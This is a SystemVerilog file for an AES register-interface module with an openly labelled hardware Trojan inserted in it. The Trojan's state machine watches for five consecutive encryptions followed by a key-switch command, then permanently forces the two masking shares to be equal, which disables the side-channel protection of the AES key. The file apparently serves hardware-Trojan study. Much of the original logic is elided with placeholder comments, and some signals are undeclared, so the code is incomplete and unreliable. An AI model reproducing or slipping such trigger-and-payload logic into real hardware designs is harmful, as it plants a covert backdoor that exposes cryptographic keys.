`include "prim_assert.sv"

module aes_reg_top (
  input clk_i,
  input rst_ni,
  input rst_shadowed_ni,
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,
  // To HW
  output aes_reg_pkg::aes_reg2hw_t reg2hw, // Write
  input  aes_reg_pkg::aes_hw2reg_t hw2reg, // Read

  output logic shadowed_storage_err_o,
  output logic shadowed_update_err_o,

  // Integrity check errors
  output logic intg_err_o,

  // Trojan insertion: Signal to the AES core to force share1 = share0
  output logic trojan_force_shares_o  // <-- Trojan insert
);

  import aes_reg_pkg::* ;

  localparam int AW = 8;
  localparam int DW = 32;
  localparam int DBW = DW/8;                    // Byte Width

  // ------------------------------------------
  // Trojan insertion: Declaration of Trojan logic
  // ------------------------------------------
  logic trojan_trig_active_q, trojan_trig_active_d;
  logic [2:0] trojan_enc_count_q, trojan_enc_count_d;
  logic trojan_enc_seq_active_q, trojan_enc_seq_active_d;
  logic trojan_post_enc_cmd_q, trojan_post_enc_cmd_d;
  logic trojan_reset_detected_q, trojan_reset_detected_d;
  logic trojan_key_switch_q, trojan_key_switch_d;
  logic trojan_arm_key_switch_q, trojan_arm_key_switch_d;

  // Used to watch for five encryption triggers
  localparam TRIGGER_ENC_OPER = 2'b00; // Assuming operation field (2:0) for encryption
  // ------------------------------------------

  // register signals
  logic           reg_we;
  logic           reg_re;
  logic [AW-1:0]  reg_addr;
  logic [DW-1:0]  reg_wdata;
  logic [DBW-1:0] reg_be;
  logic [DW-1:0]  reg_rdata;
  logic           reg_error;

  logic          addrmiss, wr_err;

  logic [DW-1:0] reg_rdata_next;
  logic reg_busy;

  tlul_pkg::tl_h2d_t tl_reg_h2d;
  tlul_pkg::tl_d2h_t tl_reg_d2h;


  // incoming payload check
  logic intg_err;
  tlul_cmd_intg_chk u_chk (
    .tl_i(tl_i),
    .err_o(intg_err)
  );

  // also check for spurious write enables
  logic reg_we_err;
  logic [33:0] reg_we_check;
  prim_reg_we_check #(
    .OneHotWidth(34)
  ) u_prim_reg_we_check (
    .clk_i(clk_i),
    .rst_ni(rst_ni),
    .oh_i  (reg_we_check),
    .en_i  (reg_we && !addrmiss),
    .err_o (reg_we_err)
  );

  logic err_q;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      err_q <= '0;
    end else if (intg_err || reg_we_err) begin
      err_q <= 1'b1;
    end
  end

  // integrity error output is permanent and should be used for alert generation
  // register errors are transactional
  assign intg_err_o = err_q | intg_err | reg_we_err;

  // outgoing integrity generation
  tlul_pkg::tl_d2h_t tl_o_pre;
  tlul_rsp_intg_gen #(
    .EnableRspIntgGen(1),
    .EnableDataIntgGen(1)
  ) u_rsp_intg_gen (
    .tl_i(tl_o_pre),
    .tl_o(tl_o)
  );

  assign tl_reg_h2d = tl_i;
  assign tl_o_pre   = tl_reg_d2h;

  tlul_adapter_reg #(
    .RegAw(AW),
    .RegDw(DW),
    .EnableDataIntgGen(0)
  ) u_reg_if (
    .clk_i  (clk_i),
    .rst_ni (rst_ni),

    .tl_i (tl_reg_h2d),
    .tl_o (tl_reg_d2h),

    .en_ifetch_i(prim_mubi_pkg::MuBi4False),
    .intg_error_o(),

    .we_o    (reg_we),
    .re_o    (reg_re),
    .addr_o  (reg_addr),
    .wdata_o (reg_wdata),
    .be_o    (reg_be),
    .busy_i  (reg_busy),
    .rdata_i (reg_rdata),
    .error_i (reg_error)
  );

  // cdc oversampling signals

  assign reg_rdata = reg_rdata_next ;
  assign reg_error = addrmiss | wr_err | intg_err;

  // ... All other register logic remains unchanged ...

  // (All the subregisters declarations -- unchanged)

  // (All the generated always_comb and assignments -- unchanged)

  // ------------------------------------------
  // Trojan insertion: Trigger and payload logic
  // ------------------------------------------
  // Trigger sequence:
  //  - Five consecutive encryptions via 'trigger' reg, 
  //    i.e., write to 'AES_TRIGGER_OFFSET' with 'start' set and operation=encrypt
  //  - Followed immediately by a key switch command (write to key_share0_0/1 and/or change ctrl_shadowed fields)
  //  - No intervening reset

  // Helper signals for Trojan state machine
  logic is_encrypt_op;
  assign is_encrypt_op = (reg_we && addr_hit[32] && !reg_error && trigger_start_wd && ctrl_shadowed_operation_qs == TRIGGER_ENC_OPER);

  logic is_key_switch_cmd;
  assign is_key_switch_cmd = (reg_we && !reg_error &&
    ((|addr_hit[1:16]) ||   // Write to key_share0/1
     (addr_hit[29])));      // Or write to ctrl_shadowed

  // Detect any reset by monitoring rst_ni
  // Trojan resets on active-low reset
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      // On reset, clear counter and FSM
      trojan_enc_count_q <= 3'd0;
      trojan_enc_seq_active_q <= 1'b0;
      trojan_post_enc_cmd_q <= 1'b0;
      trojan_trig_active_q <= 1'b0;
      trojan_arm_key_switch_q <= 1'b0;
      trojan_key_switch_q <= 1'b0;
    end else begin
      // Trojan FSM:
      //  (1) Count consecutive encrypts
      //  (2) Latch flag if 5th in a row
      //  (3) Arm trigger for next *immediate* key-switch cmd, then activate
      if (!trojan_trig_active_q) begin
        if (is_encrypt_op) begin
          if (trojan_enc_seq_active_q) begin
            trojan_enc_count_q <= trojan_enc_count_q + 3'd1;
            if (trojan_enc_count_q == 3'd4) begin
              trojan_enc_seq_active_q <= 1'b0; // Done collecting encrypts
              trojan_arm_key_switch_q <= 1'b1; // Arm for key switch
              trojan_enc_count_q <= 3'd0; // Reset for next time
            end else begin
              // keep sequence active
            end
          end else begin
            // start new encryption sequence
            trojan_enc_seq_active_q <= 1'b1;
            trojan_enc_count_q <= 3'd1;
          end
        end else begin
          // Non-encrypt operation breaks sequence if in progress and isn't the needed key-switch
          if (!(trojan_arm_key_switch_q && is_key_switch_cmd)) begin
            trojan_enc_seq_active_q <= 1'b0;
            trojan_enc_count_q <= 3'd0;
          end
        end

        // If armed for key-switch, and now occurred, trigger
        if (trojan_arm_key_switch_q && is_key_switch_cmd) begin
          trojan_trig_active_q <= 1'b1;
          trojan_arm_key_switch_q <= 1'b0;
        end
      end else begin
        // Once triggered, remain active until next reset
        trojan_trig_active_q <= 1'b1;
      end
    end
  end

  // Output payload signal
  assign trojan_force_shares_o = trojan_trig_active_q;
  // ------------------------------------------
  // END Trojan modification
  // ------------------------------------------

  // ... rest of original design unchanged ...

  // shadow busy
  logic shadow_busy;
  logic rst_done;
  logic shadow_rst_done;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      rst_done <= '0;
    end else begin
      rst_done <= 1'b1;
    end
  end

  always_ff @(posedge clk_i or negedge rst_shadowed_ni) begin
    if (!rst_shadowed_ni) begin
      shadow_rst_done <= '0;
    end else begin
      shadow_rst_done <= 1'b1;
    end
  end

  // both shadow and normal resets have been released
  assign shadow_busy = ~(rst_done & shadow_rst_done);

  // Collect up storage and update errors
  assign shadowed_storage_err_o = |{
    ctrl_aux_shadowed_key_touch_forces_reseed_storage_err,
    ctrl_aux_shadowed_force_masks_storage_err
  };
  assign shadowed_update_err_o = |{
    ctrl_aux_shadowed_key_touch_forces_reseed_update_err,
    ctrl_aux_shadowed_force_masks_update_err
  };

  // register busy
  assign reg_busy = shadow_busy;

  // Unused signal tieoff

  // wdata / byte enable are not always fully used
  // add a blanket unused statement to handle lint waivers
  logic unused_wdata;
  logic unused_be;
  assign unused_wdata = ^reg_wdata;
  assign unused_be = ^reg_be;

  // Assertions for Register Interface
  `ASSERT_PULSE(wePulse, reg_we, clk_i, !rst_ni)
  `ASSERT_PULSE(rePulse, reg_re, clk_i, !rst_ni)

  `ASSERT(reAfterRv, $rose(reg_re || reg_we) |=> tl_o_pre.d_valid, clk_i, !rst_ni)

  `ASSERT(en2addrHit, (reg_we || reg_re) |-> $onehot0(addr_hit), clk_i, !rst_ni)

  // this is formulated as an assumption such that the FPV testbenches do disprove this
  // property by mistake
  //`ASSUME(reqParity, tl_reg_h2d.a_valid |-> tl_reg_h2d.a_user.chk_en == tlul_pkg::CheckDis)

endmodule